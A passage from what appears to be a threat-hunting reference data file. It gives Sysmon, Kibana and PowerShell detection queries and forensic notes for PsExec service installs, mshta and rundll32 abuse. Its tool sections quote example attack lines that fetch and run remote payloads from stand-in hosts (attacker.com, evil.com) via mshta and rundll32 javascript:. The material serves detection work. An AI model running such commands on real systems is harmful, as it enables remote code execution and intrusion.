          { cls: "apt-mul", name: "Cobalt Strike", note: "Service-based lateral movement is a built-in Cobalt Strike capability used across APT and ransomware operations." },
          { cls: "apt-kp", name: "Lazarus", note: "Malicious service installation documented in CISA advisories on DPRK-attributed intrusions." }
        ],
        cite: "MITRE ATT&CK T1569.002"
      },
      {
        sub: "T1569.002 - PsExec Service Signature (PSEXESVC)",
        os: "win",
        indicator: "PSEXESVC service installation or PSEXESVC.exe drop on target host - PsExec lateral movement artifact",
        sysmon: `// On DESTINATION host:

// PSEXESVC.exe written to C:\\Windows\\ (EID 11):
EventID=11
TargetFilename=*\\PSEXESVC.exe

// PSEXESVC service created (EID 13 - registry value set):
EventID=13
TargetObject=*\\Services\\PSEXESVC*

// PSEXESVC process execution (EID 1):
EventID=1
Image=*\\PSEXESVC.exe

// On SOURCE host:
// SMB connection from psexec.exe to target (EID 3):
EventID=3
Image=*\\psexec.exe OR *\\psexec64.exe
DestinationPort=445`,
        kibana: `// Destination: PSEXESVC binary written to disk
winlog.event_id: 11
AND file.path: *\\PSEXESVC.exe

// Destination: PSEXESVC service registry key set
winlog.event_id: 13
AND registry.path: *\\Services\\PSEXESVC*

// Destination: System Event 7045 (service installed)
winlog.event_id: 7045
AND winlog.channel: "System"
AND winlog.event_data.ServiceName: "PSEXESVC"

// Source: psexec.exe SMB connection
winlog.event_id: 3
AND process.name: ("psexec.exe" OR "psexec64.exe")
AND destination.port: 445`,
        powershell: `# Hunt for PSEXESVC artifacts on destination host

# File artifact: PSEXESVC.exe on disk
Get-ChildItem C:\\Windows\\PSEXESVC.exe -ErrorAction SilentlyContinue |
  Select FullName, CreationTime, LastWriteTime, Length

# Registry artifact: PSEXESVC service key
Get-ItemProperty "HKLM:\\SYSTEM\\CurrentControlSet\\Services\\PSEXESVC" \`
  -ErrorAction SilentlyContinue |
  Select ImagePath, Start, ObjectName

# System Event 7045: PSEXESVC service installation
Get-WinEvent -FilterHashtable @{
  LogName='System';
  ID=7045
} | Where-Object {
  $_.Properties[0].Value -eq 'PSEXESVC'
} | Select TimeCreated,
  @{n='ServiceName';e={$_.Properties[0].Value}},
  @{n='ServiceFile';e={$_.Properties[1].Value}},
  @{n='AccountName';e={$_.Properties[4].Value}}

# Sysmon EID 11: PSEXESVC.exe file creation
Get-WinEvent -FilterHashtable @{
  LogName='Microsoft-Windows-Sysmon/Operational';
  ID=11
} | Where-Object {
  $_.Properties[0].Value -like '*PSEXESVC.exe'
} | Select TimeCreated,
  @{n='File';e={$_.Properties[0].Value}},
  @{n='CreatingProcess';e={$_.Properties[5].Value}}`,
        registry: `PSEXESVC service key (present while service is installed):
HKLM\\SYSTEM\\CurrentControlSet\\Services\\PSEXESVC\\
  ImagePath = C:\\Windows\\PSEXESVC.exe
  Start = 3 (Demand - created on-demand by PsExec)
  Type = 0x10 (Win32OwnProcess)
  ObjectName = LocalSystem

PsExec cleans up after itself - the service key and
binary are deleted after the PsExec session ends.
This means the registry artifact is transient.
Forensic artifacts that persist after cleanup:
- System Event 7045 (service installed) - log entry
  remains after service is deleted
- System Event 7009/7034 (service timeout/stop)
- MFT entry for PSEXESVC.exe (metadata persists
  in NTFS after file deletion)
- USN Journal entry for PSEXESVC.exe create/delete
- Sysmon EID 11 (FileCreate) log entry - persists
  in Sysmon log even after file is deleted

Authentication artifacts on destination:
- Security EID 4624 LogonType=3 (network logon)
  from source IP around time of PSEXESVC installation
- Security EID 4648 (explicit credentials used)
  if /u and /p flags were passed to psexec`,
        tools: `PsExec.exe / PsExec64.exe (Sysinternals/Microsoft)
  - Legitimate remote administration tool
  - Adversary use: lateral movement, remote execution
  - Leaves PSEXESVC artifact on destination
  - Context determines malicious vs legitimate

PsExec clones / reimplementations:
- Impacket psexec.py (creates same PSEXESVC artifact)
- CrackMapExec (--exec-method smbexec uses different
  service name - not PSEXESVC)
- SharpExec (C# reimplementation)
- PAExec (PsExec alternative, different service name)

Detection note: tools that reimplement the PsExec
protocol but use a different service name will NOT
trigger on PSEXESVC specifically. Broaden to:
- Any service installed with ImagePath in C:\\Windows\\
  that is not a known-good service
- Any short-lived service (EID 7045 create followed
  by EID 7036 stop within seconds)`,
        ossdetect: `Sigma:
- win_system_psexec_service_install.yml (EID 7045)
- file_event_win_psexec_service_binary.yml (EID 11)
- registry_event_win_psexec_service.yml (EID 13)
- proc_creation_win_psexec_execution.yml

Atomic Red Team:
- T1569.002 Test #3 (PsExec service creation)
- T1021.002 (SMB/Windows Admin Shares - related)

Hayabusa:
- PSEXESVCServiceInstall rules
- PsExec detection category (multiple event types)

Velociraptor:
- Windows.System.Services (catches live service)
- Windows.EventLogs.Sysmon (EID 11/13)
- Windows.Forensics.Usn (USN journal - catches
  PSEXESVC.exe create/delete even post-cleanup)

Network-side complement:
- hunt.6b74.dev Lateral Movement reference
  for SMB-based lateral movement network detection`,
        notes: "PSEXESVC is one of the most reliable lateral movement fingerprints in Windows forensics precisely because PsExec is so widely used - by both legitimate administrators and adversaries. The detection is straightforward: PSEXESVC.exe should never appear in C:\\Windows\\ in a healthy environment outside of an active PsExec session. The challenge is that PsExec cleans up after itself, so the window for live detection is short. The forensic artifacts that survive cleanup (System Event 7045, Sysmon EID 11, USN Journal) are your primary post-incident evidence sources. Context is everything here: seeing PSEXESVC in logs from a known IT admin workstation targeting a server it manages during business hours is probably legitimate. Seeing PSEXESVC originating from a developer workstation, a user endpoint, or targeting a domain controller is worth immediate investigation. Impacket psexec.py deserves a callout: it's a Python reimplementation of the PsExec protocol that produces the same PSEXESVC artifact on the destination, so this detection catches Impacket psexec.py as well as the legitimate Sysinternals tool.",
        apt: [
          { cls: "apt-ru", name: "APT29", note: "PsExec and Impacket psexec.py used for lateral movement in SolarWinds and other documented operations." },
          { cls: "apt-cn", name: "APT41", note: "PsExec-based lateral movement documented across multiple sector intrusions." },
          { cls: "apt-mul", name: "Ransomware", note: "PsExec is the single most commonly observed lateral movement tool in ransomware incident response engagements." },
          { cls: "apt-mul", name: "Impacket", note: "psexec.py produces identical PSEXESVC artifact - standard tool across red team and APT lateral movement." },
          { cls: "apt-mul", name: "FIN7", note: "PsExec lateral movement documented across financial sector intrusions." }
        ],
        cite: "MITRE ATT&CK T1569.002, T1021.002"
      },
      {
        sub: "T1569.002 - Service Binary in Non-Standard Path",
        os: "win",
        indicator: "Registered service with ImagePath outside standard system directories - hunting for malicious persistence via service registry",
        sysmon: `// Real-time: Sysmon EID 13 (registry value set)
// catches service ImagePath being written:
EventID=13
TargetObject=*\\Services\\*\\ImagePath
Details NOT matching:
  C:\\Windows\\System32\\*
  C:\\Windows\\SysWOW64\\*
  C:\\Program Files\\*
  C:\\Program Files (x86)\\*

// Supplementary - service execution artifact:
EventID=1
ParentImage=*\\services.exe
Image NOT matching known-good service paths
// services.exe is the SCM host - it spawns
// services directly, making it a useful parent filter`,
        kibana: `// Real-time: ImagePath written outside standard paths
winlog.event_id: 13
AND registry.path: *\\Services\\*\\ImagePath
AND NOT registry.data.strings: ("C:\\\\Windows\\\\System32\\\\*" OR "C:\\\\Windows\\\\SysWOW64\\\\*" OR "C:\\\\Program Files\\\\*" OR "C:\\\\Program Files (x86)\\\\*")

// Service execution from non-standard path
winlog.event_id: 1
AND process.parent.name: "services.exe"
AND NOT process.executable: ("C:\\\\Windows\\\\*" OR "C:\\\\Program Files\\\\*" OR "C:\\\\Program Files (x86)\\\\*")`,
        powershell: `# Hunt for services with ImagePath outside standard directories
$standardPaths = @(
  'C:\\Windows\\',
  'C:\\Program Files\\',
  'C:\\Program Files (x86)\\'
)

Get-ItemProperty "HKLM:\\SYSTEM\\CurrentControlSet\\Services\\*" |
  Where-Object {
    $ip = $_.ImagePath
    if (-not $ip) { return $false }
    $ip = $ip.TrimStart('"') -replace '^([^"]+).*','$1'
    $ip = [System.Environment]::ExpandEnvironmentVariables($ip)
    -not ($standardPaths | Where-Object { $ip -like "$_*" })
  } | Select-Object \`
    @{n='ServiceName';e={$_.PSChildName}},
    @{n='ImagePath';e={$_.ImagePath}},
    @{n='Start';e={
      switch ($_.Start) {
        0 {'Boot'} 1 {'System'} 2 {'Auto'}
        3 {'Demand'} 4 {'Disabled'} default {$_}
      }
    }},
    @{n='ObjectName';e={$_.ObjectName}},
    @{n='DisplayName';e={$_.DisplayName}} |
  Sort-Object ServiceName`,
        registry: `Primary artifact - service ImagePath:
HKLM\\SYSTEM\\CurrentControlSet\\Services\\<Name>\\
  ImagePath - full path to service binary
  (may include arguments after the binary path)
  (may be quoted or unquoted)
  (may use environment variables: %SystemRoot%\\...)

Suspicious ImagePath patterns to hunt:
- C:\\Users\\<user>\\AppData\\*
- C:\\Windows\\Temp\\*
- C:\\ProgramData\\*
- C:\\Users\\Public\\*
- Relative paths (no drive letter)
- UNC paths (\\\\server\\share\\binary.exe)
- Paths containing scripting interpreters as the binary

Baseline approach:
- Export all service ImagePaths on a known-good system
- Compare against target system
- New entries with non-standard paths = investigate

Deleted service forensics:
- System Event 7036 (service stopped) and
  absence of 7045 for a service that previously
  existed suggests manual deletion
- MFT and USN Journal retain file metadata
  for the service binary even after deletion`,
        tools: `This indicator is hunting-oriented - sweep for
existing malicious services rather than real-time
creation detection (covered in indicator 1).

Most useful in:
- IR triage: what services exist that shouldn't?
- Baseline deviation: new services since last audit
- Post-persistence-establishment hunting
- Fleet-wide sweep via Velociraptor or EDR

Service creation tools (all leave ImagePath artifact):
sc.exe create
PowerShell New-Service / Register-ServiceJob
Compiled code using CreateService() Win32 API
Metasploit persistence modules
SharPersist
Cobalt Strike persistence
Any tool writing directly to the Services registry key

Known-good exceptions to tune out:
- Security software (AV, EDR agents)
- Monitoring agents (Elastic, Splunk UF, etc.)
- Vendor software with non-standard install paths
- Build allowlist from asset management / SCCM data`,
        ossdetect: `Sigma:
- registry_event_win_service_registry_susp_path.yml
- proc_creation_win_services_susp_child_process.yml

Atomic Red Team:
- T1569.002 (service creation variants)
- T1543.003 (Create or Modify System Process: Windows Service)

Hayabusa:
- ServiceBinaryNonStandardPath rules (EID 13)
- services.exe child process anomaly detection

Velociraptor:
- Windows.System.Services
  (best single artifact for fleet-wide service hunting)
- Windows.Forensics.Autoruns

Sysinternals autoruns.exe:
- Services tab with VirusTotal integration
- Highlights unsigned service binaries in red/yellow
- Most practical tool for manual IR triage`,
        notes: "This is the hunt-oriented companion to the real-time sc.exe detection - same concept as the scheduled task action hunting indicator in T1053.005. The PowerShell registry sweep is the core tool: it enumerates every registered service's ImagePath and flags anything outside standard system and program directories. The key challenge is normalization: ImagePath values can be quoted, unquoted, contain environment variables (%SystemRoot%), or embed arguments after the binary path - the hunt script handles this. Environment variable expansion is important because %SystemRoot%\\system32\\svchost.exe is legitimate but looks non-standard if you string-match on C:\\Windows without expanding the variable first. Services running from C:\\ProgramData\\ deserve particular scrutiny - it's a world-writable directory that doesn't appear in standard path allowlists, making it a common adversary staging location. The services.exe parent filter in the Sysmon section is a useful real-time complement: services.exe is the SCM binary that directly spawns services, so filtering Sysmon EID 1 on ParentImage=services.exe and checking the child's path against standard directories gives live execution coverage for this indicator.",
        apt: [
          { cls: "apt-ru", name: "APT29", note: "Malicious service binaries in non-standard paths documented in long-dwell espionage operations." },
          { cls: "apt-cn", name: "APT41", note: "Services with ImagePath in ProgramData and AppData documented across multiple intrusions." },
          { cls: "apt-mul", name: "Ransomware", note: "Ransomware persistence via services with binaries in world-writable paths documented across multiple families." },
          { cls: "apt-mul", name: "FIN6", note: "Malicious service installation with non-standard binary paths documented in financial sector intrusions." },
          { cls: "apt-mul", name: "Red Teams", note: "Service binary staging in ProgramData or Temp is standard red team persistence tradecraft." }
        ],
        cite: "MITRE ATT&CK T1569.002, T1543.003"
      }
    ]
  },
  {
    id: "T1218.005",
    name: "System Binary Proxy Execution: Mshta",
    desc: "mshta.exe HTA execution, URL invocation, inline VBS/JS payloads",
    rows: [
      {
        sub: "T1218.005 - mshta.exe with Remote URL Argument",
        os: "win",
        indicator: "mshta.exe invoked with HTTP/HTTPS URL or UNC path - fetches and executes remote HTA payload",
        sysmon: `EventID=1
Image=*\\mshta.exe
CommandLine matches:
  *http://* OR *https://* OR *\\\\\\\\*

// Also network connection from mshta to non-Microsoft:
EventID=3
Image=*\\mshta.exe
DestinationPort=80 OR 443 OR 8080`,
        kibana: `// Primary: mshta with URL or UNC in command line
winlog.event_id: 1
AND process.name: "mshta.exe"
AND process.command_line: (*http\:\/\/* OR *https\:\/\/* OR *\\\\\\\\*)

// Supplementary: mshta initiating outbound connection
winlog.event_id: 3
AND process.name: "mshta.exe"
AND destination.port: (80 OR 443 OR 8080)`,
        powershell: `# Hunt for mshta.exe with URL/UNC argument
Get-WinEvent -FilterHashtable @{
  LogName='Microsoft-Windows-Sysmon/Operational';
  ID=1
} | Where-Object {
  $_.Properties[4].Value -like '*\\mshta.exe' -and
  $_.Properties[10].Value -match '(http://|https://|\\\\\\\\)'
} | Select TimeCreated,
  @{n='CmdLine';e={$_.Properties[10].Value}},
  @{n='Parent';e={($_.Properties[20].Value -split '\\\\')[-1]}},
  @{n='User';e={$_.Properties[12].Value}} |
  Sort-Object TimeCreated -Descending

# Supplementary: outbound network from mshta
Get-WinEvent -FilterHashtable @{
  LogName='Microsoft-Windows-Sysmon/Operational';
  ID=3
} | Where-Object {
  $_.Properties[4].Value -like '*\\mshta.exe'
} | Select TimeCreated,
  @{n='DestIP';e={$_.Properties[14].Value}},
  @{n='DestHost';e={$_.Properties[15].Value}},
  @{n='DestPort';e={$_.Properties[16].Value}}`,
        registry: `mshta.exe location (legitimate):
- C:\\Windows\\System32\\mshta.exe
- C:\\Windows\\SysWOW64\\mshta.exe
mshta.exe found anywhere else = high-confidence IOC

HTA file artifacts (if HTA downloaded to disk first):
- %TEMP%\\*.hta
- %APPDATA%\\*.hta
- IE/Edge download cache:
  %LOCALAPPDATA%\\Microsoft\\Windows\\
    INetCache\\IE\\<random>\\<file>.hta

Zone.Identifier ADS on downloaded HTA:
- Get-Item file.hta -Stream Zone.Identifier
  ZoneId=3 = internet origin

URL cache for mshta:
- Same as IE cache (mshta uses WinINet for fetches)
- %LOCALAPPDATA%\\Microsoft\\Windows\\
    INetCache\\IE\\*

Investigation pivots:
- What process spawned mshta?
  Parent process tells the delivery vector
- What did mshta spawn afterward?
  HTA payloads typically launch cmd, powershell,
  or drop and execute a binary - chain into child
  process analysis`,
        tools: `Phishing operators (mshta as second stage)
Cobalt Strike (HTA payload generation built-in)
Metasploit (exploit/windows/misc/hta_shell)
Empire (HTA-based stagers)
DotNetToJScript (generates HTA-loadable payloads)
Custom HTA droppers (still common in 2026)

Common mshta abuse patterns:
- mshta.exe http://attacker.com/payload.hta
  (remote HTA fetch - one-line RCE)
- mshta.exe \\\\attacker\\share\\payload.hta
  (UNC path - same idea via SMB)
- mshta.exe vbscript:CreateObject("Wscript.Shell")
  .Run("cmd.exe /c whoami")(window.close)
  (inline VBScript - no file needed)
- mshta.exe javascript:alert(1) (inline JScript)

LOLBAS catalog reference:
- lolbas-project.github.io/lolbas/Binaries/Mshta/
- Documents all known mshta abuse techniques`,
        ossdetect: `Sigma:
- proc_creation_win_mshta_url_argument.yml
- proc_creation_win_mshta_inline_susp.yml
- proc_creation_win_mshta_susp_parent.yml
- network_connection_win_mshta.yml

Atomic Red Team:
- T1218.005 Test #1 (mshta executing HTA)
- T1218.005 Test #2 (mshta inline JScript)

Hayabusa:
- MshtaUrlArgument rules
- MshtaInlineScript detection category

Velociraptor:
- Windows.EventLogs.Sysmon
- Windows.Forensics.SRUM (network connections per process)

LOLBAS project:
- lolbas-project.github.io/lolbas/Binaries/Mshta/
- Comprehensive abuse documentation`,
        notes: "mshta.exe is one of the cleanest one-line remote code execution primitives in Windows. The detection sweet spot is the argument: legitimate mshta usage almost never involves a URL or UNC path - HTAs in legitimate enterprise software are launched from local installed paths. A URL in the mshta command line is high-fidelity malicious in virtually all environments. The inline VBScript and JScript variants (`mshta.exe vbscript:...` and `mshta.exe javascript:...`) are even cleaner indicators because they require no remote fetch - the entire payload is on the command line. Worth pairing this indicator with parent process context: mshta spawned by an Office app, browser, or explorer.exe is a phishing chain; mshta spawned by a known IT management process is more likely legitimate. The network connection pivot (EID 3 from mshta) is useful for catching the fetch portion when the URL itself has been obfuscated in the command line.",
        apt: [
          { cls: "apt-ru", name: "APT28", note: "HTA-based delivery documented in spearphishing campaigns." },
          { cls: "apt-cn", name: "APT41", note: "mshta-based loaders documented across operations targeting multiple sectors." },
          { cls: "apt-kp", name: "Kimsuky", note: "HTA delivery extensively documented in operations against South Korean targets." },
          { cls: "apt-mul", name: "Commodity Malware", note: "Trickbot, IcedID, and various phishing operators have used mshta-based delivery chains." },
          { cls: "apt-mul", name: "Red Teams", note: "Cobalt Strike HTA payload generation is a standard red team capability." }
        ],
        cite: "MITRE ATT&CK T1218.005"
      },
      {
        sub: "T1218.005 - mshta.exe with Inline Script Payload",
        os: "win",
        indicator: "mshta.exe with vbscript: or javascript: protocol handler in command line - fileless inline execution",
        sysmon: `EventID=1
Image=*\\mshta.exe
CommandLine matches:
  *vbscript:* OR *javascript:* OR *jscript:*

// These protocol handlers tell mshta to execute the
// rest of the command line as inline script - no
// remote fetch, no file on disk required`,
        kibana: `winlog.event_id: 1
AND process.name: "mshta.exe"
AND process.command_line: (*vbscript\:* OR *javascript\:* OR *jscript\:*)`,
        powershell: `# Hunt for mshta with inline script protocol handlers
Get-WinEvent -FilterHashtable @{
  LogName='Microsoft-Windows-Sysmon/Operational';
  ID=1
} | Where-Object {
  $_.Properties[4].Value -like '*\\mshta.exe' -and
  $_.Properties[10].Value -match '(vbscript|javascript|jscript):'
} | Select TimeCreated,
  @{n='CmdLine';e={$_.Properties[10].Value}},
  @{n='Parent';e={($_.Properties[20].Value -split '\\\\')[-1]}},
  @{n='User';e={$_.Properties[12].Value}} |
  Sort-Object TimeCreated -Descending`,
        registry: `No file artifact - inline scripts execute from memory.

The full payload is in the command line itself:
- Sysmon EID 1 CommandLine field captures everything
- Process command line is the primary forensic artifact
- Decode any base64 or string concatenation in the payload
  to understand intent

Investigation pivots:
- Child processes of mshta:
  Sysmon EID 1, filter ParentProcessId = mshta PID
- Network connections from mshta:
  Sysmon EID 3 within same session
- Subsequent file writes:
  Sysmon EID 11 from mshta or its children

Common adversary inline payload patterns:
- CreateObject("Wscript.Shell").Run(...)
  (spawning cmd or powershell)
- CreateObject("MSXML2.XMLHTTP")
  (HTTP request from mshta - second-stage download)
- Eval(base64decoded string)
  (obfuscated payload decoding inline)`,
        tools: `Inline mshta payloads are typically:
- One-line phishing payloads embedded in HTA files
- Manually crafted operator commands
- Part of multi-stage chains where stage 1 is a
  short bootstrap and stage 2+ are downloaded

Generators / frameworks:
Cobalt Strike (HTA generation with inline option)
Manual operators using Wscript.Shell COM object
PowerShell Empire HTA stagers

The inline form is most often seen in:
- HTML email phishing where the HTA content is
  embedded directly in a downloaded file
- LOLBAS abuse demonstrations and training material
- Memory-only post-exploitation (no file artifact)`,
        ossdetect: `Sigma:
- proc_creation_win_mshta_inline_susp.yml
- proc_creation_win_mshta_vbscript.yml
- proc_creation_win_mshta_javascript.yml

Atomic Red Team:
- T1218.005 Test #2 (mshta inline JScript)
- T1218.005 Test #3 (mshta inline VBScript)

Hayabusa:
- MshtaInlineScript detection rules
- High-fidelity (no legitimate use case)

Velociraptor:
- Windows.EventLogs.Sysmon

LOLBAS project:
- lolbas-project.github.io/lolbas/Binaries/Mshta/`,
        notes: "The inline script variant (vbscript: / javascript: / jscript: protocol handlers) has near-zero legitimate use in modern enterprise environments. Unlike the URL variant where the false positive consideration is 'is this an internal HTA app being launched legitimately,' the inline form is almost exclusively an attacker convenience. The payload appears directly in the command line, which is both an opportunity and a challenge: opportunity because the full intent is visible in a single Sysmon event; challenge because the payload is often obfuscated with string concatenation, character codes, or chained CreateObject calls to defeat string matching. Detection should focus on the protocol handler keywords (vbscript:, javascript:, jscript:) rather than trying to pattern-match the payload itself. Once an alert fires, manual decoding of the command line reveals intent. Pair with child process analysis: inline mshta almost always spawns cmd.exe or powershell.exe as a follow-on stage.",
        apt: [
          { cls: "apt-cn", name: "APT41", note: "Inline mshta payloads documented in operations targeting tech and gaming sectors." },
          { cls: "apt-kp", name: "Kimsuky", note: "Inline VBScript via mshta documented in operations against South Korean and US targets." },
          { cls: "apt-mul", name: "Red Teams", note: "Inline mshta is a standard LOLBin abuse demonstration in red team toolkits." },
          { cls: "apt-mul", name: "Phishing Operators", note: "Inline mshta payloads in HTA email attachments documented across commodity phishing campaigns." }
        ],
        cite: "MITRE ATT&CK T1218.005"
      }
    ]
  },
  {
    id: "T1218.011",
    name: "System Binary Proxy Execution: Rundll32",
    desc: "rundll32.exe DLL execution abuse, javascript: invocation, no-args anomaly",
    rows: [
      {
        sub: "T1218.011 - rundll32.exe Loading DLL from Suspicious Path",
        os: "win",
        indicator: "rundll32.exe with DLL argument pointing to user-writable path or non-standard location",
        sysmon: `EventID=1
Image=*\\rundll32.exe
CommandLine matches:
  *\\AppData\\* OR *\\Temp\\*
  OR *\\ProgramData\\* OR *\\Users\\Public\\*
  OR *\\Downloads\\*

// Also watch for unsigned DLL load by rundll32:
EventID=7 (Image Load)
Image=*\\rundll32.exe
Signed=false`,
        kibana: `// Primary: rundll32 with suspicious DLL path
winlog.event_id: 1
AND process.name: "rundll32.exe"
AND process.command_line: (*\\AppData\\* OR *\\Temp\\* OR *\\ProgramData\\* OR *\\Public\\* OR *\\Downloads\\*)

// Supplementary: unsigned DLL loaded by rundll32 (EID 7)
winlog.event_id: 7
AND process.name: "rundll32.exe"
AND file.code_signature.signed: false`,
        powershell: `# Hunt for rundll32 loading DLLs from suspicious paths (EID 1)
Get-WinEvent -FilterHashtable @{
  LogName='Microsoft-Windows-Sysmon/Operational';
  ID=1
} | Where-Object {
  $_.Properties[4].Value -like '*\\rundll32.exe' -and
  $_.Properties[10].Value -match
    '(AppData|Temp|ProgramData|Public|Downloads)'
} | Select TimeCreated,
  @{n='CmdLine';e={$_.Properties[10].Value}},
  @{n='Parent';e={($_.Properties[20].Value -split '\\\\')[-1]}},
  @{n='User';e={$_.Properties[12].Value}} |
  Sort-Object TimeCreated -Descending

# Supplementary: unsigned DLLs loaded by rundll32 (EID 7)
Get-WinEvent -FilterHashtable @{
  LogName='Microsoft-Windows-Sysmon/Operational';
  ID=7
} | Where-Object {
  $_.Properties[4].Value -like '*\\rundll32.exe' -and
  $_.Properties[13].Value -eq 'false'
} | Select TimeCreated,
  @{n='LoadedDLL';e={$_.Properties[5].Value}},
  @{n='Signed';e={$_.Properties[13].Value}}`,
        registry: `rundll32.exe location (legitimate):
- C:\\Windows\\System32\\rundll32.exe
- C:\\Windows\\SysWOW64\\rundll32.exe

DLL on disk - primary forensic artifact:
- Inspect the DLL specified in the rundll32 command line
- Check signature: Get-AuthenticodeSignature <path>
- Check entropy: high entropy = likely packed/encrypted
- Check exports: dumpbin /exports or Get-PEHeader

DLL search order context:
- Rundll32 loads DLLs from the path given in the command line
- If only a name is given (no path), Windows DLL search
  order applies - this is the side-loading attack surface
  (covered in T1129 Shared Modules)

Common adversary DLL drop locations:
- %APPDATA%\\<random>.dll
- %TEMP%\\<random>.dll
- C:\\ProgramData\\<random>.dll
- %PUBLIC%\\<random>.dll
- Filename obfuscation: .dat, .tmp, .log extensions
  with actual DLL content inside

Investigation pivots:
- Sysmon EID 11 (FileCreate) for the DLL drop event
- USN Journal for DLL creation time even after deletion
- $MFT for deleted DLL metadata`,
        tools: `Cobalt Strike (rundll32-based payloads built-in)
Metasploit (windows/local/rundll32 modules)
Empire (rundll32 stagers)
Custom DLL loaders for second-stage delivery
SmokeLoader, IcedID, QakBot (rundll32 in delivery chains)

LOLBAS abuse patterns:
- rundll32.exe shell32.dll,Control_RunDLL
  <malicious_cpl_file>
  (Control Panel applet abuse - .cpl is a DLL)
- rundll32.exe url.dll,FileProtocolHandler
  <malicious_URL>
  (URL handler abuse - launches default app for URL)
- rundll32.exe javascript:"\..\mshtml,
  RunHTMLApplication ";document.write();
  GetObject("script:http://evil.com/x.sct")
  (JavaScript invocation - covered in next indicator)

LOLBAS reference:
- lolbas-project.github.io/lolbas/Binaries/Rundll32/
- ~15 documented rundll32 abuse techniques`,
        ossdetect: `Sigma:
- proc_creation_win_rundll32_susp_dll_path.yml
- proc_creation_win_rundll32_dll_from_user_path.yml
- image_load_win_rundll32_unsigned_dll.yml (EID 7)

Atomic Red Team:
- T1218.011 Test #1 (rundll32 loading DLL)
- T1218.011 Test #4 (rundll32 with payload DLL)

Hayabusa:
- Rundll32SuspDllPath rules (EID 1)
- Rundll32UnsignedDll detection (EID 7)

Velociraptor:
- Windows.EventLogs.Sysmon
- Windows.System.DLL (loaded DLLs per process)

LOLBAS project:
- lolbas-project.github.io/lolbas/Binaries/Rundll32/`,
        notes: "rundll32.exe is the most ubiquitous LOLBin in Windows - it's used constantly by legitimate Windows operations to invoke functions in system DLLs. The detection is path-focused: legitimate rundll32 calls load DLLs from System32, SysWOW64, or known vendor program directories. Rundll32 loading a DLL from AppData, Temp, ProgramData, or Public is high-confidence malicious in nearly all environments. The unsigned DLL angle via Sysmon EID 7 is a useful complement - it catches cases where the path is plausible but the DLL itself has no Microsoft or vendor signature. False positives: some legitimate vendor software does invoke rundll32 with DLLs from non-standard paths during installation, particularly older or poorly-designed installers. Build allowlists from baseline data. Pair with parent process context: rundll32 spawned by an Office app, browser, or explorer.exe with a DLL in AppData = phishing chain.",
        apt: [
          { cls: "apt-cn", name: "APT41", note: "Rundll32-based DLL loaders documented across multiple sector intrusions." },
          { cls: "apt-ru", name: "APT28", note: "Rundll32 abuse documented in operations using custom DLL payloads." },
          { cls: "apt-mul", name: "IcedID", note: "IcedID uses rundll32 to load its main DLL component as a standard delivery pattern." },
          { cls: "apt-mul", name: "QakBot", note: "QakBot relies heavily on rundll32 for executing its main payload DLL." },
          { cls: "apt-mul", name: "Ransomware", note: "Ransomware staging via rundll32-loaded DLLs documented across multiple families." }
        ],
        cite: "MITRE ATT&CK T1218.011"
      },
      {
        sub: "T1218.011 - rundll32.exe with JavaScript Protocol",
        os: "win",
        indicator: "rundll32.exe with javascript: in command line - abuses MSHTML library to execute inline JScript or fetch remote scriptlet",
        sysmon: `EventID=1
Image=*\\rundll32.exe
CommandLine matches:
  *javascript:* OR *jscript:*

// This pattern abuses a quirk of rundll32 calling
// mshtml.dll's RunHTMLApplication function with a
// javascript: URI - similar conceptually to mshta
// inline execution but via a different binary`,
        kibana: `winlog.event_id: 1
AND process.name: "rundll32.exe"
AND process.command_line: (*javascript\:* OR *jscript\:*)`,
        powershell: `# Hunt for rundll32 javascript: invocation
Get-WinEvent -FilterHashtable @{
  LogName='Microsoft-Windows-Sysmon/Operational';
  ID=1
} | Where-Object {
  $_.Properties[4].Value -like '*\\rundll32.exe' -and
  $_.Properties[10].Value -match '(javascript|jscript):'
} | Select TimeCreated,
  @{n='CmdLine';e={$_.Properties[10].Value}},
  @{n='Parent';e={($_.Properties[20].Value -split '\\\\')[-1]}},
  @{n='User';e={$_.Properties[12].Value}} |
  Sort-Object TimeCreated -Descending`,
        registry: `No persistent file artifact - inline JavaScript
runs from memory inside rundll32 process context.

The full payload is visible in Sysmon EID 1 CommandLine.

Common pattern decode:
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";
  document.write();GetObject("script:http://evil.com/x.sct")

Breakdown:
- mshtml = mshtml.dll (Microsoft's HTML rendering engine)
- RunHTMLApplication = exported function from mshtml
- javascript: protocol = the inline payload
- GetObject("script:URL") = fetches and runs scriptlet

Investigation pivots:
- Outbound network connection from rundll32:
  Sysmon EID 3 - typically fetches a .sct scriptlet
- Child processes:
  scriptlet often spawns cmd or powershell as next stage`,
        tools: `Original research:
- Casey Smith (subTee) documented rundll32 javascript:
  invocation alongside other LOLBin discoveries

Used by:
Cobalt Strike (alternative stager option)
Manual operators using LOLBin techniques
Some commodity malware loaders
DotNetToJScript-generated payloads

Practical usage:
- Bypasses some AppLocker / WDAC configurations
  that allow rundll32 but block mshta or wscript
- Bypasses string-based detections looking for
  mshta-specific patterns
- Less common than mshta inline scripts but
  shares the same conceptual attack surface`,
        ossdetect: `Sigma:
- proc_creation_win_rundll32_javascript.yml
- proc_creation_win_rundll32_inline_script.yml

Atomic Red Team:
- T1218.011 Test #2 (rundll32 javascript: variant)

Hayabusa:
- Rundll32JavascriptProtocol detection rules
- High-fidelity (no legitimate use case)

LOLBAS project:
- lolbas-project.github.io/lolbas/Binaries/Rundll32/
  (documents javascript: technique variant)

Casey Smith research:
- Original LOLBin abuse demonstrations
- Foundation for understanding signed binary proxy
  execution as a category`,
        notes: "The javascript: protocol abuse via rundll32 is conceptually similar to mshta inline script execution - both rely on a Microsoft-signed binary loading the MSHTML or scripting engine and executing attacker-supplied code inline. Detection is straightforward because the pattern has no legitimate use: rundll32.exe with javascript: in the command line is high-confidence malicious. The technique is less common than mshta inline scripts in commodity malware but appears in environments where the operator suspects mshta is blocked or heavily monitored. Pair with outbound network detection: rundll32 making HTTP/HTTPS connections after a javascript: invocation typically means the inline code is fetching a second-stage scriptlet.",
        apt: [
          { cls: "apt-mul", name: "Casey Smith Research", note: "Originally documented as part of LOLBin abuse demonstrations." },
          { cls: "apt-mul", name: "Red Teams", note: "Standard alternative to mshta inline scripts when mshta is blocked or monitored." },
          { cls: "apt-cn", name: "APT41", note: "rundll32 javascript: variant documented in some intrusion reports." },
          { cls: "apt-mul", name: "Commodity Malware", note: "Used by some loader families as a mshta alternative." }
        ],
        cite: "MITRE ATT&CK T1218.011"
      },
      {
        sub: "T1218.011 - rundll32.exe with No Arguments",
        os: "win",
        indicator: "rundll32.exe process running with empty or near-empty command line - process hollowing or thread injection target",
